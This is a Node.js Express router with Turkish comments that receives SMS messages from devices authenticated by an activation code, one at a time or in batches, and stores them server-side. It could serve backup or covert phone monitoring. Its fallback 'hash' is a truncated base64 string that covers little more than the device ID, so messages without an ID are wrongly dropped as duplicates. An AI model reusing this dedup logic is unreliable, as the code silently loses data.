const express = require('express');
const router = express.Router();
const Device = require('../../models/Device');
const SMS = require('../../models/SMS');
const { deviceAuth } = require('../../middleware/auth');
const { logDeviceAction } = require('../../services/activityLogger');

/**
 * POST /api/device/sms
 * SMS'leri senkronize et
 * Header: activation-code
 * Body: { messages: [{ phoneNumber, contactName, message, type, timestamp }] }
 */
router.post('/sms', deviceAuth, async (req, res) => {
  try {
    const { messages } = req.body;
    const device = req.device;

    if (!messages || !Array.isArray(messages)) {
      return res.status(400).json({
        success: false,
        message: 'Mesaj listesi gerekli (messages array)'
      });
    }

    if (messages.length === 0) {
      return res.json({
        success: true,
        message: 'Gönderilecek mesaj yok',
        synced: 0
      });
    }

    // Mesajları hazırla
    const smsDocuments = messages.map(msg => ({
      deviceId: device._id,
      smsId: msg.smsId || null, // Android SMS ID
      phoneNumber: msg.phoneNumber,
      contactName: msg.contactName || '',
      message: msg.message,
      type: msg.type || 'received',
      timestamp: new Date(msg.timestamp),
      receivedAt: new Date()
    }));

    const processedMessages = [];
    const existingSmsIds = new Set();

    for (const smsDoc of smsDocuments) {
      // Eğer smsId varsa, onu kullan (yeni sistem)
      if (smsDoc.smsId) {
        // Bu SMS ID bu cihazda zaten var mı?
        if (existingSmsIds.has(smsDoc.smsId)) {
          console.log(`SMS ID ${smsDoc.smsId} bu batch'te duplicate, atlanıyor`);
          continue;
        }
        existingSmsIds.add(smsDoc.smsId);
      } else {
        // Eski sistem için hash kullan (backward compatibility)
        const hashData = `${smsDoc.deviceId}${smsDoc.phoneNumber}${smsDoc.timestamp}${smsDoc.message.substring(0, 50)}`;
        const hash = Buffer.from(hashData).toString('base64').substring(0, 32);

        const exists = await SMS.findOne({ messageHash: hash });
        if (exists) continue;
        smsDoc.messageHash = hash;
      }
      processedMessages.push(smsDoc);
    }

    // Yeni mesajları kaydet
    let syncedCount = 0;
    if (processedMessages.length > 0) {
      const result = await SMS.insertMany(processedMessages, { ordered: false }).catch(err => {
        // Duplicate key hatalarını yoksay
        if (err.code === 11000) {
          return { insertedCount: err.insertedDocs?.length || 0 };
        }
        throw err;
      });
      syncedCount = result.insertedCount || processedMessages.length;
    }

    // Cihaz bilgilerini güncelle
    device.status = 'online';
    device.lastSeen = new Date();
    device.totalSMS = await SMS.countDocuments({ deviceId: device._id });
    await device.save();

    // Log
    if (syncedCount > 0) {
      await logDeviceAction(null, 'SMS_SYNC', device, req, `${syncedCount} SMS senkronize edildi`);
    }

    res.json({
      success: true,
      message: `${syncedCount} SMS senkronize edildi`,
      synced: syncedCount,
      duplicates: messages.length - syncedCount
    });
  } catch (error) {
    console.error('SMS sync hatası:', error);
    res.status(500).json({
      success: false,
      message: 'Sunucu hatası'
    });
  }
});

/**
 * POST /api/device/sms/single
 * Tek SMS gönder (anında - broadcast receiver için)
 * Header: activation-code
 * Body: { phoneNumber, contactName, message, type, timestamp }
 */
router.post('/sms/single', deviceAuth, async (req, res) => {
  try {
    const { smsId, phoneNumber, contactName, message, type, timestamp } = req.body;
    const device = req.device;

    // Validation
    if (!phoneNumber || !message) {
      return res.status(400).json({
        success: false,
        message: 'Telefon numarası ve mesaj gerekli'
      });
    }

    // SMS oluştur
    const smsDoc = {
      deviceId: device._id,
      smsId: smsId || null,
      phoneNumber,
      contactName: contactName || '',
      message,
      type: type || 'received',
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      receivedAt: new Date()
    };

    // Duplicate kontrolü - smsId varsa onu kullan, yoksa hash
    let exists = null;
    if (smsDoc.smsId) {
      exists = await SMS.findOne({ deviceId: device._id, smsId: smsDoc.smsId });
    } else {
      // Hash oluştur ve duplicate kontrolü
      const hashData = `${smsDoc.deviceId}${smsDoc.phoneNumber}${smsDoc.timestamp}${smsDoc.message.substring(0, 50)}`;
      const hash = Buffer.from(hashData).toString('base64').substring(0, 32);
      smsDoc.messageHash = hash;
      exists = await SMS.findOne({ messageHash: hash });
    }
    if (exists) {
      return res.json({
        success: true,
        message: 'Bu SMS zaten mevcut',
        duplicate: true
      });
    }

    // SMS kaydet
    const savedSMS = await SMS.create(smsDoc);

    // Cihaz bilgilerini güncelle
    device.status = 'online';
    device.lastSeen = new Date();
    device.totalSMS += 1;
    await device.save();

    res.json({
      success: true,
      message: 'SMS kaydedildi',
      sms: {
        id: savedSMS._id,
        phoneNumber: savedSMS.phoneNumber,
        type: savedSMS.type,
        timestamp: savedSMS.timestamp
      }
    });
  } catch (error) {
    console.error('SMS single hatası:', error);
    res.status(500).json({
      success: false,
      message: 'Sunucu hatası'
    });
  }
});

/**
 * GET /api/device/sms/last-sync
 * Son senkronizasyon zamanını al
 * Header: activation-code
 */
router.get('/sms/last-sync', deviceAuth, async (req, res) => {
  try {
    const device = req.device;

    // Son SMS'in zamanını al
    const lastSMS = await SMS.findOne({ deviceId: device._id })
      .sort({ timestamp: -1 })
      .select('timestamp');

    res.json({
      success: true,
      lastSyncTimestamp: lastSMS?.timestamp || null,
      totalSMS: device.totalSMS
    });
  } catch (error) {
    console.error('Last sync hatası:', error);
    res.status(500).json({
      success: false,
      message: 'Sunucu hatası'
    });
  }
});

module.exports = router;
